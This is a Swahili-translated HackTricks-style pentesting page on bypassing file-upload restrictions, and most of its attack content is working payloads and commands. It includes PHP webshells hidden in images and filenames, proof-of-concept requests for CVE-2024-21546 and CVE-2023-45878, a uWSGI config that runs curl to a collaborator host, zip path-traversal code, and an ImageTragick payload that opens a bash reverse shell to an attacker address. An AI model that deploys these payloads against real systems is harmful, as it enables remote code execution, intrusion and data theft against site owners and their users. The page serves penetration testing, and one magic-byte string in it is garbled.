# Kupakia Faili

{{#include ../../banners/hacktricks-training.md}}

## Mbinu za Jumla za Kupakia Faili

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, .php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Kupita ukaguzi wa nyongeza za faili

1. Ikiwa zinatumika, **angalia** **nyongeza zilizotajwa hapo awali.** Pia zipime kwa kutumia **herufi kubwa**: _pHp, .pHP5, .PhAr ..._
2. _Angalia **kuongeza nyongeza halali kabla ya** nyongeza ya utekelezaji (tumia pia nyongeza zilizotajwa hapo awali):_
- _file.png.php_
- _file.png.Php5_
3. Jaribu kuongeza **herufi maalum mwishoni.** Unaweza kutumia Burp kufanya **bruteforce** kwa herufi zote za **ASCII** na **Unicode**. (_Kumbuka unaweza pia kujaribu kutumia **nyongeza** zilizotajwa **hapo awali**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Jaribu kupita vizingiti kwa **kuudanganya extension parser** upande wa server na mbinu kama **kurudia** nyongeza au **kuongeza data zisizohitajika** (byte za **null**) kati ya nyongeza. _Unaweza pia kutumia **nyongeza zilizotajwa hapo awali** kuandaa payload bora._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Ongeza **tabaka lingine la nyongeza** kwenye ukaguzi uliopita:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Jaribu kuweka **nyongeza ya utekelezaji kabla ya nyongeza halali** na uombe server iwe misconfigured. (inafaa kutafuta misconfigurations ya Apache ambapo chochote chenye nyongeza **.php**, hata kama si lazima kinaishie kwa .php, kitaweza kuendesha code):
- _ex: file.php.png_
7. Kutumia **NTFS alternate data stream (ADS)** katika **Windows**. Katika kesi hii, tabia ya kolon ":" itaingizwa baada ya nyongeza iliyokatazwa na kabla ya ile inayoruhusiwa. Matokeo yake, faili tupu yenye nyongeza iliyokatazwa itaundwa kwenye server (mfano "file.asax:.jpg”). Faili hii inaweza kuhaririwa baadaye kwa mbinu nyingine kama kutumia jina fupi la faili. Muundo "**::$data**” pia unaweza kutumika kuunda faili zisizo tupu. Kwa hivyo, kuongeza nukta baada ya muundo huu pia inaweza kuwa muhimu kupita vikwazo zaidi (mfano "file.asp::$data.”)
8. Jaribu kuvunja mipaka ya jina la faili. Nyongeza halali inakatika. Na PHP hasidi inabaki. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Baadhi ya upload handlers hukata au ku-normalize nukta za mwisho (trailing dot) kutoka kwa jina la faili lililohifadhiwa. Katika UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) toleo kabla ya 2.9.1, unaweza kupita ukaguzi wa nyongeza kwa:

- Kutumia MIME ya picha halali na magic header (mfano, PNG’s `\x89PNG\r\n\x1a\n`).
- Kuiruhusu jina la faili iliyopakuliwa kuwa na nyongeza ya PHP ikifuatiwa na nukta, kwa mfano, `shell.php.`.
- Server hutakata nukta ya mwisho na kuhifadhi `shell.php`, ambayo itaendeshwa ikiwa itakapowekwa katika directory inayotumika kwa web (stora ya umma ya default kama `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Kisha fikia njia iliyohifadhiwa (kawaida katika Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Sasisha unisharp/laravel-filemanager hadi ≥ 2.9.1.
- Tekeleza strict server-side allowlists na thibitisha tena persisted filename.
- Serve uploads kutoka maeneo yasiyo-executable.

### Kuepuka Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks kwa kuweka **value** ya **Content-Type** **header** kuwa: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check kwa kuongeza mwanzoni mwa faili **bytes of a real image** (ili kudanganya amri ya _file_). Au ingiza shell ndani ya **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` au unaweza pia **kuingiza payload moja kwa moja** ndani ya image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ikiwa **compression inayoletwa kwenye image yako**, kwa mfano kwa kutumia maktaba za kawaida za PHP kama [PHP-GD](https://www.php.net/manual/fr/book.image.php), mbinu zilizotangulia hazitatumika. Hata hivyo, unaweza kutumia **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuingiza maandishi yatakayestahimili compression.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Ukurasa wa wavuti pia unaweza kuwa unafanyia **resizing** image, kwa mfano kwa kutumia PHP-GD functions `imagecopyresized` au `imagecopyresampled`. Hata hivyo, unaweza kutumia **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuingiza maandishi yatakayestahimili compression.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Mbinu nyingine ya kutengeneza payload inayestahimili image resizing, kwa kutumia PHP-GD function `thumbnailImage`. Hata hivyo, unaweza kutumia **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kuingiza maandishi yatakayestahimili compression.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Mbinu Nyingine za Kuangalia

- Tafuta udhaifu wa kubadilisha jina la faili iliyopakuliwa tayari (ili kubadilisha extension).
- Tafuta Local File Inclusion vulnerability ili kutekeleza backdoor.
- **Possible Information disclosure**:
1. Pakia **mara kadhaa** (na kwa **wakati mmoja**) **faili ile ile** yenye **jina moja**
2. Pakia faili yenye **jina** la **file** au **folder** ambalo **tayari lipo**
3. Kupakia faili yenye majina ya `"." , "..", or "…"` kama jina lake. Kwa mfano, kwenye Apache kwenye **Windows**, ikiwa application inahifadhi uploaded files katika "/www/uploads/" directory, jina la faili "." litaunda faili liitwalo "uploads" katika directory "/www/".
4. Pakia faili ambayo inaweza isiwe rahisi kufutwa kama **"…:.jpg"** kwenye **NTFS**. (Windows)
5. Pakia faili kwenye **Windows** yenye **invalid characters** kama `|<>*?”` katika jina lake. (Windows)
6. Pakia faili kwenye **Windows** ukitumia **reserved** (**forbidden**) **names** kama CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, na LPT9.
- Jaribu pia kupakia an executable (.exe) au `.html` (inayoonekana isiyoshtua) ambayo itatekeleza code inapofunguliwa kwa bahati mbaya na mwanaathiriwa.

### Special extension tricks

Ikiwa unajaribu kupakia faili kwenye **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ikiwa unajaribu kupakia faili kwenye **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Faili za `.phar` ni kama `.jar` kwa java, lakini kwa php, na zinaweza **kutumika kama php file** (kuzitekeleza kwa php, au kuzijumlisha ndani ya script...)

Extension ya `.inc` mara nyingi hutumika kwa php files zinazotumika tu **kuimport files**, hivyo, wakati fulani, mtu anaweza kuruhusu **extension hii itekelezwe**.

## **Jetty RCE**

Ikiwa unaweza kupakia faili ya XML kwenye Jetty server unaweza kupata [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Kwa hivyo, kama inavyoonyeshwa kwenye picha ifuatayo, pakia faili ya XML kwenye `$JETTY_BASE/webapps/` na tarajia shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Kwa uchambuzi wa kina wa udhaifu huyu angalia utafiti wa asili: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Udhaifu za Remote Command Execution (RCE) zinaweza kutumika kwenye uWSGI servers ikiwa mtu ana uwezo wa kubadilisha `.ini` configuration file. uWSGI configuration files hutegemea syntax maalum kujumuisha "magic" variables, placeholders, na operators. Kwa mfano, operator '@', inayotumika kama `@(filename)`, imeundwa kujumuisha yaliyomo ya file. Miongoni mwa schemes mbalimbali zinazotambuliwa na uWSGI, scheme ya "exec" ni hasa yenye nguvu, ikiruhusu kusoma data kutoka standard output ya mchakato. Kipengele hiki kinaweza kutumiwa kwa madhumuni mabaya kama Remote Command Execution au Arbitrary File Write/Read wakati `.ini` configuration file inapototolewa.

Tafakari mfano ufuatao wa hatari wa `uwsgi.ini` file, unaoonyesha schemes mbalimbali:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Utekelezaji wa payload hufanyika wakati faili ya usanidi inachanganuliwa. Ili usanidi uanze kutumika na kuchanganuliwa, mchakato wa uWSGI lazima uanzishwe upya (kwa mfano baada ya crash au kutokana na Denial of Service attack) au faili lazima iwe imewekwa ku-auto-reload. Kipengele cha auto-reload, ikiwa kimewezeshwa, kinapakia tena faili kwa vipindi vilivyobainishwa linapogundua mabadiliko.

Ni muhimu kuelewa jinsi uchanganaji wa faili za usanidi za uWSGI unavyokuwa mwepesi. Hasa, payload iliyojadiliwa inaweza kuingizwa ndani ya faili ya binary (kama picha au PDF), jambo linalopanua zaidi wigo wa potential exploitation.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Endpoint isiyothibitishwa katika Gibbon LMS inaruhusu uandishi wa faili kwa makusudi ndani ya web root, ikisababisha pre-auth RCE kwa kuacha faili ya PHP. Toleo zilizoathirika: hadi na pamoja na 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Njia: POST
- Vigezo vinavyohitajika:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server inapuuza type/name, inafanya base64-decode sehemu ya mwisho)
- `path`: jina la faili linalolengwa kulingana na Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: thamani yoyote isiyo tupu inakubaliwa (e.g., `0000000001`)

Minimal PoC ya kuandika na kusoma tena faili:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Pakia webshell mdogo na endesha amri:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Vidokezo:
- Mshughuliki hufanya `base64_decode($_POST["img"])` baada ya kugawanya kwa `;` na `,`, kisha inaandika bytes kwa `$absolutePath . '/' . $_POST['path']` bila kuthibitisha extension/type.
- Msimbo utakaotokana unaendesha kama mtumiaji wa web service (kwa mfano, XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

Katika baadhi ya matukio unaweza kugundua kuwa seva inatumia **`wget`** kupakua **faili** na unaweza **kuonyesha** **URL**. Katika hali hizi, msimbo unaweza kuwa unakagua kwamba extension ya faili zilizopakuliwa iko kwenye whitelist ili kuhakikisha kwamba ni faili zilizoruhusiwa tu zitakazopakuliwa. Hata hivyo, **ukaguzi huu unaweza kuvukiwa.**\
Urefu wa **maximum** wa **filename** katika **linux** ni **255**, hata hivyo, **wget** hupunguza majina ya faili hadi **236** characters. Unaweza **download a file called "A"*232+".php"+".gif"**, jina hili la faili lita**bypass** **check** (kama katika mfano huu **".gif"** ni **valid** extension) lakini `wget` itanipa jina jipya la faili kuwa **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Zana

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ni zana yenye nguvu iliyoundwa kusaidia Pentesters na Bug Hunters katika kujaribu mifumo ya kupakia faili. Inatumia mbinu mbalimbali za bug bounty ili kurahisisha mchakato wa kutambua na kutumia udhaifu, ikihakikisha tathmini kamili za web applications.

### Corrupting upload indices with snprintf quirks (historical)

Baadhi ya upload handlers za zamani ambazo zinatumia `snprintf()` au sawa ili kujenga arrays za faili nyingi kutoka kwa upload ya faili moja zinaweza kudanganywa kujifanya zinafanya forge ya muundo wa `_FILES`. Kutokana na kutokukamilika na kukatwa kwa tabia ya `snprintf()`, upload iliyoundwa kwa uangalifu inaweza kuonekana kama faili nyingi zilizo na index kwenye upande wa server, ikachanganya mantiki inayodhani muundo thabiti (mfano, kuitaza kama upload ya faili nyingi na kuchukua matawi hatarishi). Ingawa ni nadra leo, muundo huu wa “index corruption” mara kwa mara huibuka tena katika CTFs na codebases za zamani.

## From File upload to other vulnerabilities

- Weka **filename** kuwa `../../../tmp/lol.png` na jaribu kupata **path traversal**
- Weka **filename** kuwa `sleep(10)-- -.jpg` na huenda ukaweza kupata **SQL injection**
- Weka **filename** kuwa `<svg onload=alert(document.domain)>` ili kupata XSS
- Weka **filename** kuwa `; sleep 10;` ili kujaribu command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Jaribu **different svg payloads** kutoka [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ikiwa unaweza **kuonyesha web server ichukue picha kutoka kwa URL** unaweza kujaribu kubadilisha kwa kutumia [SSRF](../ssrf-server-side-request-forgery/index.html). Ikiwa picha hii itahifadhiwa kwenye tovuti **public**, unaweza pia kuonyesha URL kutoka [https://iplogger.org/invisible/](https://iplogger.org/invisible/) na **kuiba taarifa za kila mgeni**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF zilizotengenezwa kwa njia maalumu kwa XSS: Ukurasa wa [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Ikiwa unaweza kupakia PDFs unaweza kuandaa PDF itakayotekeleza JS kwa mujibu wa maelekezo yaliyotolewa.
- Pakia yaliyomo ya \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) ili kuangalia kama server ina **antivirus**
- Angalia kama kuna **kizuizi cha ukubwa** wakati wa kupakia faili

Hapa kuna orodha ya top 10 ya mambo unayoweza kufanya kwa kupakia (kutoka [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Rejea [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) kwa aina nyingine za faili.

## Zip/Tar File Automatically decompressed Upload

Ikiwa unaweza kupakia ZIP ambayo itafunguliwa ndani ya server, unaweza kufanya vitu 2:

### Symlink

Pakia archive lenye soft links kuelekea kwa faili nyingine, kisha kwa kufikia faili zilizofunguliwa utaweza kufikia faili zilizohusishwa:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Kufungua (decompress) katika folda tofauti

Uundaji wa mafaili yasiyotarajiwa ndani ya directories wakati wa decompression ni tatizo kubwa. Ingawa awali mtu angefikiri kwamba mpangilio huu unaweza kuzuia OS-level command execution kupitia malicious file uploads, msaada wa hierarchical compression na uwezo wa directory traversal wa fomati ya ZIP unaweza kutumika vibaya. Hii inawawezesha attackers kupita vikwazo na kutoroka kutoka kwa secure upload directories kwa kudanganya decompression functionality ya application iliyolengwa.

Automated exploit ya kutengeneza mafaili kama hayo inapatikana kwenye [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Zana inaweza kutumika kama ifuatavyo:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zaidi ya hayo, **symlink trick with evilarc** ni chaguo. Ikiwa lengo ni kulenga faili kama `/flag.txt`, symlink kwa faili hiyo inapaswa kuundwa kwenye mfumo wako. Hii inahakikisha kwamba evilarc haitapata makosa wakati wa kuendesha.

Hapo chini kuna mfano wa Python code unaotumika kuunda faili ya zip yenye madhara:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Kutumia vibaya compression kwa file spraying**

Kwa maelezo zaidi **angalia chapisho la asili katika**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Msimbo wa PHP umeandikwa kutekeleza amri zinazopitishwa kupitia variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Faili nyingi zinaumbwa na archive ya zip inajengwa ikijumuisha faili hizi.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Majina ya faili ndani ya zip yanabadilishwa kwa kutumia vi au hex editor, kubadilisha "xxA" kuwa "../" ili kupita kwenye directories.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Pakia yaliyomo haya kwa extension ya picha ili kutumia udhaifu **(ImageMagick , 7.0.1-1)** (tazama [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Kuingiza PHP shell ndani ya chunk ya IDAT ya faili ya PNG kunaweza kuzuia kwa ufanisi baadhi ya operesheni za usindikaji wa picha. Funsioni `imagecopyresized` na `imagecopyresampled` kutoka PHP-GD zina umuhimu maalum katika muktadha huu, kwani kwa kawaida zinatumiwa kwa resizing na resampling ya picha, mtawalia. Uwezo wa PHP shell iliyojazwa kubaki isiyoathiriwa na operesheni hizi ni faida muhimu kwa matumizi fulani.

Uchambuzi wa kina wa mbinu hii, ikiwa ni pamoja na metodolojia na matumizi yake yanayowezekana, unapatikana katika makala ifuatayo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Rasilimali hii inatoa uelewa mpana wa mchakato na athari zake.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files zinatumika kama zana ya kipekee katika usalama wa mtandao, zikifanya kazi kama chameleon ambazo zinaweza kuwepo kwa uhalali katika miundo mbalimbali ya faili kwa wakati mmoja. Mfano wa kuvutia ni [GIFAR](https://en.wikipedia.org/wiki/Gifar), nyongeza inayofanya kazi wakati huo huo kama GIF na archive ya RAR. Faili hizi hazizuiliki kwa jozi hii tu; mchanganyiko kama GIF na JS au PPT na JS pia inawezekana.

Faida kuu ya polyglot files iko katika uwezo wao wa kuepuka viwango vya usalama vinavyoscreen faili kulingana na aina. Mazoezi ya kawaida katika programu mbalimbali ni kuruhusu aina maalum za faili kwa upload—kama JPEG, GIF, au DOC—ili kupunguza hatari inayotokana na muundo hatari (mfano, JS, PHP, au Phar files). Hata hivyo, polyglot, kwa kufuata vigezo vya muundo vya aina nyingi za faili, inaweza kupita kwa utupu vikwazo hivi kwa siri.

Licha ya ufanisi wao, polyglots hukutana na vizingiti. Kwa mfano, wakati polyglot inaweza kuwa PHAR file (PHp ARchive) na JPEG kwa pamoja, mafanikio ya upload yake yanaweza kutegemea sera za extension za jukwaa. Ikiwa mfumo ni mkali kuhusu extensions zinazokubaliwa, uraia wa muundo wa polyglot peke yake unaweza kutokutosha kuhakikisha upload yake.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Jinsi ya kuepuka detection za aina ya faili kwa kupakia faili halali ya JSON hata kama haikuruhusiwa kwa kuiga faili ya PDF (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Iwapo tu magic bytes `%PDF` ziko katika 1024 ya kwanza, inachukuliwa kuwa halali (pata mfano kutoka kwenye post)
- **`pdflib` library**: Weka muundo bandia wa PDF ndani ya field ya JSON ili library ianze kuifikiria kuwa ni pdf (pata mfano kutoka kwenye post)
- **`file` binary**: Inaweza kusoma hadi 1048576 bytes kutoka kwa faili. Unda JSON kubwa kuliko hiyo ili isiweze kuchambua yaliyomo kama json kisha ndani ya JSON weka sehemu ya mwanzo ya PDF halisi na itadhani kuwa ni PDF

## Marejeo

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
